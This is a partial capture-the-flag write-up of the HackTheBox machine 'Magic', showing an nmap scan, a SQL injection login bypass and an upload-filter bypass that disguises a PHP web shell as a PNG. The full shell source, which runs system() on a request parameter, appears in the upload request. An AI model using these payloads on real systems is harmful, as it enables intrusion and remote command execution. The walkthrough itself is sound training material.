Title:HTB: Magic
Date: xx-19-2020 11:25
category:security
tags:security, boot2root, HTB, linux, Upload, SUID, SQLi
meta:security, boot2root, HTB, linux, Upload, SUID, SQLi

<img class="align-left" src="/media/2020.xx/magic_card.png" alt="Magic card" width="262">

This is a writeup about a retired HacktheBox machine:
[Magic](https://www.hackthebox.eu/home/machines/profile/241) publish by
[TRX](https://www.hackthebox.eu/home/users/profile/31190) on April 18 2020.
This box is classified as a medium machine but is quit easy.
It involves a basic SQL injection, a magic file upload and a SUID binary.

<!-- PELICAN_END_SUMMARY -->

# Recon

We start with an nmap scan. Only the ports 22 (SSH) and 80 (HTTP).

    :::text
    # Nmap 7.80 scan initiated Mon Apr 20 11:14:29 2020 as: nmap -p- -oN nmap 10.10.10.185
    Nmap scan report for 10.10.10.185
    Host is up (0.016s latency).
    Not shown: 65533 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http

    # Nmap done at Mon Apr 20 11:14:42 2020 -- 1 IP address (1 host up) scanned in 12.63 seconds


# Web

The website expose some picture gallery.

![main page](/media/2020.xx/magic_01.png)

The website announce that we need to login to upload new picture.

![login form](/media/2020.xx/magic_02.png)

Some mechanism forbid us to put space in our username and password. We fire up
Burp and edit the request using the `Intercept` function so that our post
request look like the following

    :::text
    POST /login.php HTTP/1.1
    Host: 10.10.10.185
    Connection: close
    Cookie: PHPSESSID=aakul5ai43vudv9rqhpfoedqcs

    username=aa' or 1=1 -- &password=a

We are then logged in and we can upload picture using the application.

![upload form](/media/2020.xx/magic_03.png)

Obviously we want to upload some PHP file for instance
`/usr/share/webshells/php/simple-backdoor.php`. We intercept the request with
Burp and change the Content-Type to `image/png` and the image name to
`simple-backdoor.php.png`.

Our request is blocked and the application send us the following message
`<script>alert('What are you trying to do there?')</script><!DOCTYPE HTML>`

That where the name of the box is relevant. We need to add the
PNG [magic number](https://en.wikipedia.org/wiki/List_of_file_signatures) to
our file.

Still using Burp we add `aaaaaaaa` at the begging of our file.

![Burp request with aaaaaaaa](/media/2020.xx/magic_04.png)

Using the Raw editor in Burp we replace our `a` (`61`) by the PNG's magic number
`89 50 4E 47 0D 0A 1A 0A`.

![Burp request with PNG's magic number](/media/2020.xx/magic_05.png)

Our request now looks like the following (copy-pasting it will failed as the
magic number will not correctly be copied):

    POST /upload.php HTTP/1.1
    Host: 10.10.10.185
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://10.10.10.185/upload.php
    Content-Type: multipart/form-data; boundary=---------------------------1971341748341881315972996739
    Content-Length: 692
    Connection: close
    Cookie: PHPSESSID=gl7e03c4vb6ejee40tgeobjhfh
    Upgrade-Insecure-Requests: 1
    
    -----------------------------1971341748341881315972996739
    Content-Disposition: form-data; name="image"; filename="simple-backdoor2.php.png"
    Content-Type: image/png
    
    Â‰PNG
    
    
    <!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

    <?php

    if(isset($_REQUEST['cmd'])){
            echo "<pre>";
            $cmd = ($_REQUEST['cmd']);
            system($cmd);
            echo "</pre>";
            die;
    }

    ?>

    Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

    <!--    http://michaeldaw.org   2006    -->
    
    -----------------------------1971341748341881315972996739
    Content-Disposition: form-data; name="submit"
    
    Upload Image
    -----------------------------1971341748341881315972996739--
